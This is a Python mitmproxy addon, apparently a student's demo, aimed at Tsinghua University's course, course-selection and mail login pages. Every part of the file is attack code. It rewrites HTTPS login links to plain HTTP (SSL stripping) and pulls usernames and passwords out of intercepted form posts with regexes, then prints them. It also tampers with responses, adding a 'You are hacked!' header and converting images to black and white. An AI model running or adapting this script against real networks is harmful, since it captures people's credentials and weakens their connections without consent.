import urllib.parse
import io
import re
from mitmproxy import ctx
from PIL import Image

PASSWORD_REGEXS = [
  ('learn', re.compile('userid=(?P<username>.+)&userpass=(?P<password>.+)&submit')),
  ('zhjwxk', re.compile('j_username=(?P<username>.+)&j_password=(?P<password>.+)&captchaflag')),
  ('mail', re.compile('uid=(?P<username>.+)&password=(?P<password>.+)&domain'))
]
URL_TRANSFORMS = [
  (b'https://learn.tsinghua.edu.cn/MultiLanguage/lesson/teacher/loginteacher.jsp', b'http://learn.tsinghua.edu.cn/MultiLanguage/lesson/teacher/loginteacher.jsp'),
  (b'https://zhjwxk.cic.tsinghua.edu.cn:443/j_acegi_formlogin_xsxk.do', b'http://zhjwxk.cic.tsinghua.edu.cn/j_acegi_formlogin_xsxk.do'),
  (b'https://mails.tsinghua.edu.cn/coremail/index.jsp', b'http://mails.tsinghua.edu.cn/coremail/index.jsp'),
  (b'https://mail.tsinghua.edu.cn/coremail/index.jsp', b'http://mail.tsinghua.edu.cn/coremail/index.jsp'),
  (b'twd15,15', b'equipment,15')
]

class Trans:
  def __init__(self):
    pass
  
  def request(self, flow):
    try:
      flow.request.query['tp'] = 'jpeg'
    except Exception as e:
      pass
    try:
      for name, regex in PASSWORD_REGEXS:
        m = regex.search(flow.request.text)
        if not m:
          continue
        print(name)
        print('  Username: ', urllib.parse.unquote_plus(m.group('username')))
        print('  Password: ', urllib.parse.unquote_plus(m.group('password')))
    except Exception as e:
      pass

  def response(self, flow):
    flow.response.headers['x-twd2-message'] = 'You are hacked!'
    for old, new in URL_TRANSFORMS:
      try:
        flow.response.content = flow.response.content.replace(old, new)
      except Exception as e:
        pass
    try:
      stream = io.BytesIO(flow.response.content)
      img = Image.open(stream)
      img = img.convert('1')
      stream = io.BytesIO()
      img.save(stream, format='PNG')
      flow.response.content = stream.getvalue()
      print('image!')
    except Exception as e:
      repr(e)


addons = [
  Trans()
]

